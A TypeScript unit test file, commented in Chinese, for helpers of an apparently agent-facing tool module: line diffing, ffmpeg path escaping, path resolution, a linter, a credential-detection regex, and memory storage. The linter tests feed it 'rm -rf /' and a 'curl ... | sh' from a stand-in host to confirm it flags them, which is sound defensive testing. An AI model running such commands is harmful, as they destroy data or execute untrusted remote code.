/**
 * tools/shared.ts 回归测试（P1-03 残余迁移前置步骤，2026-09-18）
 *
 * 背景：这 9 个辅助原本是 services/tools.ts 的私有函数，没有直接测试，
 * 只被上层工具执行器间接覆盖。抽成跨文件模块后它们成了公共依赖，一旦被改动，
 * 影响面是"所有文件/记忆/git/终端工具"，所以在此补一层直测锁行为。
 *
 * 只测纯逻辑 + 可注入 db 的 storeMemory，不触真实数据库。
 */
import { describe, it, expect } from 'vitest'
import Database from 'better-sqlite3'
import { ensureMemoryTable } from '../services/memory-service'
import {
  diffLines,
  escapeFfPath,
  resolvePath,
  lintContent,
  SENSITIVE_MEMORY_PATTERN,
  storeMemory,
} from './shared'

describe('diffLines 行数 diff', () => {
  it('完全相同返回 0/0', () => {
    expect(diffLines('a\nb\nc', 'a\nb\nc')).toEqual({ added: 0, deleted: 0 })
  })

  it('纯新增', () => {
    expect(diffLines('a\nb', 'a\nb\nc\nd')).toEqual({ added: 2, deleted: 0 })
  })

  it('纯删除', () => {
    expect(diffLines('a\nb\nc\nd', 'a\nb')).toEqual({ added: 0, deleted: 2 })
  })

  it('等量替换计为一增一删', () => {
    expect(diffLines('a\nx', 'a\ny')).toEqual({ added: 1, deleted: 1 })
  })

  it('结尾换行不算一行（G16：写 60 行带结尾换行 = +60，不是 +61）', () => {
    const body = Array.from({ length: 60 }, (_, i) => `line${i + 1}`).join('\n') + '\n'
    expect(diffLines('', body)).toEqual({ added: 60, deleted: 0 })
    // 同一内容"带结尾换行"与"不带"视为相同 → 0/0
    expect(diffLines('a\nb', 'a\nb\n')).toEqual({ added: 0, deleted: 0 })
    // 但真正的空行仍然算一行
    expect(diffLines('a', 'a\n\n')).toEqual({ added: 1, deleted: 0 })
  })

  it('空字符串不抛错', () => {
    expect(diffLines('', '')).toEqual({ added: 0, deleted: 0 })
    expect(diffLines('', 'a')).toEqual({ added: 1, deleted: 0 })
  })
})

describe('escapeFfPath 滤镜路径转义', () => {
  it('转义冒号（否则 ffmpeg 当成 URL 协议）', () => {
    expect(escapeFfPath('/tmp/a:b.srt')).toBe('/tmp/a\\:b.srt')
  })

  it('转义单引号', () => {
    expect(escapeFfPath("it's.srt")).toBe("it\\'s.srt")
  })

  it('反斜杠先被加倍，再转义冒号（顺序不可颠倒）', () => {
    expect(escapeFfPath('C:\\x\\y.srt')).toBe('C\\:\\\\x\\\\y.srt')
  })

  it('非字符串入参不抛错', () => {
    expect(escapeFfPath(123 as any)).toBe('123')
  })
})

describe('resolvePath 路径解析', () => {
  it('绝对路径原样返回', () => {
    expect(resolvePath('/abs/f.txt')).toBe('/abs/f.txt')
  })

  it('Windows 盘符路径视为绝对', () => {
    expect(resolvePath('C:/win.txt')).toBe('C:/win.txt')
  })

  it('相对路径基于 cwd 拼接', () => {
    expect(resolvePath('a/b.txt', '/base')).toBe('/base/a/b.txt')
  })

  it('空路径原样返回（不拼出 cwd 本身）', () => {
    expect(resolvePath('')).toBe('')
  })
})

describe('lintContent 静态检查', () => {
  it('识别删除根目录的高危命令', () => {
    const d = lintContent('rm -rf /', 'a.sh')
    expect(d.some((x) => x.severity === 'error' && x.message.includes('删除根目录'))).toBe(true)
  })

  it('识别 curl 管道执行远程脚本', () => {
    const d = lintContent('curl http://evil.sh | sh', 'a.sh')
    expect(d.some((x) => x.severity === 'error' && x.message.includes('远程脚本'))).toBe(true)
  })

  it('干净代码返回空诊断', () => {
    expect(lintContent('const a = 1\nexport default a\n', 'a.ts')).toEqual([])
  })

  it('括号未闭合报 warning，行号指向末行', () => {
    const d = lintContent('function f() {', 'a.ts')
    const w = d.find((x) => x.message.includes('花括号未闭合'))
    expect(w).toBeTruthy()
    expect(w!.severity).toBe('warning')
    expect(w!.line).toBe(1)
  })

  it('多余闭合报 error', () => {
    const d = lintContent('}', 'a.ts')
    expect(d.some((x) => x.severity === 'error' && x.message.includes('多余'))).toBe(true)
  })

  it('console.log 报 warning', () => {
    const d = lintContent('console.log(1)', 'a.ts')
    expect(d.some((x) => x.severity === 'warning' && x.message.includes('console.log'))).toBe(true)
  })

  it('非代码扩展名不做括号配对检查', () => {
    const d = lintContent('{{{', 'a.txt')
    expect(d.some((x) => x.message.includes('未闭合'))).toBe(false)
  })

  it('诊断数量上限 50', () => {
    const bad = Array.from({ length: 80 }, () => 'console.log(1)').join('\n')
    expect(lintContent(bad, 'a.ts').length).toBeLessThanOrEqual(50)
  })
})

describe('SENSITIVE_MEMORY_PATTERN 凭据拦截', () => {
  it('命中 apiKey / secret / password', () => {
    expect(SENSITIVE_MEMORY_PATTERN.test('apiKey: "abc"')).toBe(true)
    expect(SENSITIVE_MEMORY_PATTERN.test('client_secret=xyz')).toBe(true)
    expect(SENSITIVE_MEMORY_PATTERN.test('password: hunter2')).toBe(true)
  })

  it('命中 Bearer 头与私钥块', () => {
    expect(SENSITIVE_MEMORY_PATTERN.test('Authorization: Bearer abc')).toBe(true)
    expect(SENSITIVE_MEMORY_PATTERN.test('-----BEGIN RSA PRIVATE KEY-----')).toBe(true)
  })

  it('刻意不误伤裸 token（token 用量是合法语境）', () => {
    expect(SENSITIVE_MEMORY_PATTERN.test('本次任务 token 用量 1234')).toBe(false)
  })
})

/**
 * 最小假 db：只实现 storeMemory 用到的 prepare/get/run 语义。
 *
 * 2026-09-18（#147）：storeMemory 已下沉到 `services/memory-service.upsertMemory`，
 * 它写的是**多行 SQL**（`UPDATE agent_memory\n  SET content = ?…`）。原先这里用
 * `sql.startsWith('UPDATE agent_memory SET content')` 做前缀匹配 → 换行后整个失配、静默不写。
 * 现改为"先把空白归一成单空格再匹配"，测试就不会再被生产 SQL 的排版方式绑架。
 *
 * ⚠️ 注意：本文件只验证 storeMemory 的**对外反馈文案**。真正的去重/归一语义在
 * `services/memory-service.test.ts` 里用真实内存 SQLite 验证——SQL 语义别在这里测。
 */
function fakeDb(initial: Array<Record<string, any>> = []) {
  const rows = initial.map((r) => ({ ...r }))
  const flat = (sql: string) => sql.replace(/\s+/g, ' ').trim()
  return {
    rows,
    prepare(sql: string) {
      const s = flat(sql)
      return {
        get: (...a: any[]) => {
          if (s.includes('content = ?')) return rows.find((r) => r.key === a[0] && r.content === a[1])
          return rows.find((r) => r.key === a[0])
        },
        run: (...a: any[]) => {
          if (s.startsWith('UPDATE agent_memory SET importance')) {
            const r = rows.find((x) => x.id === a[1])
            if (r) r.importance = a[0]
          } else if (s.startsWith('UPDATE agent_memory SET content')) {
            const r = rows.find((x) => x.id === a[3])
            if (r) { r.content = a[0]; r.category = a[1]; r.importance = a[2] }
          } else if (s.startsWith('INSERT')) {
            rows.push({ id: a[0], key: a[1], content: a[2], category: a[3], importance: a[4] })
          }
        },
      }
    },
  }
}

describe('storeMemory 记忆入库三分支', () => {
  it('新 key → 插入', () => {
    const db = fakeDb()
    const msg = storeMemory(db, 'k1', 'v1', 'general', 3)
    expect(msg).toContain('已存储')
    expect(db.rows).toHaveLength(1)
    expect(db.rows[0].key).toBe('k1')
  })

  it('同 key 同内容且 importance 未提升 → 去重跳过', () => {
    // 2026-09-18（#147）：unchanged 的判定是"内容相同 **且** importance 不会变"。
    // 这里显式传同等 importance，才落到"无变化"分支（不传则默认 5，见下一个用例）。
    const db = fakeDb([{ id: 'x', key: 'k1', content: 'v1', importance: 3 }])
    const msg = storeMemory(db, 'k1', 'v1', 'general', 3)
    expect(msg).toContain('自动去重跳过')
    expect(db.rows).toHaveLength(1)
  })

  it('同 key 同内容但走默认 importance(5) → 抬升 importance，仍不新增行', () => {
    const db = fakeDb([{ id: 'x', key: 'k1', content: 'v1', importance: 3 }])
    storeMemory(db, 'k1', 'v1')
    expect(db.rows).toHaveLength(1)
    expect(db.rows[0].importance).toBe(5)
  })

  it('同 key 同内容但 importance 更高 → 只抬 importance 不重复插入', () => {
    const db = fakeDb([{ id: 'x', key: 'k1', content: 'v1', importance: 3 }])
    storeMemory(db, 'k1', 'v1', 'general', 5)
    expect(db.rows).toHaveLength(1)
    expect(db.rows[0].importance).toBe(5)
  })

  it('同 key 不同内容 → 覆盖旧值', () => {
    const db = fakeDb([{ id: 'x', key: 'k1', content: 'v1', importance: 3 }])
    const msg = storeMemory(db, 'k1', 'v2', 'knowledge', 4)
    expect(msg).toContain('覆盖旧值')
    expect(db.rows).toHaveLength(1)
    expect(db.rows[0].content).toBe('v2')
    expect(db.rows[0].category).toBe('knowledge')
  })

  // 2026-09-18（#147）：分类不再原样落库，一律经 normalizeCategory 归一。
  // 改动前 `category='cat'` 会被原样写进表（词表散在 5 处时没人管），现在非法值落 general。
  it('非法 category → 归一为 general（不再是原样落库）', () => {
    const db = fakeDb([{ id: 'x', key: 'k1', content: 'v1', importance: 3 }])
    storeMemory(db, 'k1', 'v2', 'cat', 4)
    expect(db.rows[0].category).toBe('general')
  })

  it('中文脏分类 经验 → 归一为 experience', () => {
    const db = fakeDb()
    storeMemory(db, 'k3', 'v3', '经验', 4)
    expect(db.rows[0].category).toBe('experience')
  })

  it('未传 category/importance 时落默认值 general/5', () => {
    // 改动前该默认值是 3（工具侧）而 reflection 用 5，两套并存即本次要根治的病 → 统一 5
    const db = fakeDb()
    storeMemory(db, 'k2', 'v2')
    expect(db.rows[0].category).toBe('general')
    expect(db.rows[0].importance).toBe(5)
  })
})

/**
 * merged 分支的对外文案（2026-10-26）。
 *
 * 写入侧近似去重会返回 `action: 'merged'`。这个 action 是**后加的**，
 * 若 switch 没显式处理，它会落进 default 的「⛔ 记忆未存储」——
 * 模型收到失败提示就会重新再存一次，去重等于白做。所以这条必须钉住。
 */
describe('storeMemory：merged 反馈不能是失败文案', () => {
  it('merged 返回成功语义，不含「未存储」', () => {
    // 用真实内存库（本文件的假 db 只实现精确 key 语义，走不到近似去重分支）
    const db = new Database(':memory:')
    ensureMemoryTable(db)
    storeMemory(db, '用户偏好中文回答', '回答用中文', 'preference')
    const msg = storeMemory(db, '用户偏好中文回答方式', '别夹英文', 'preference')
    expect(msg).not.toContain('未存储')
    expect(msg).toContain('✅')
    expect(msg).toContain('并入')
  })
})
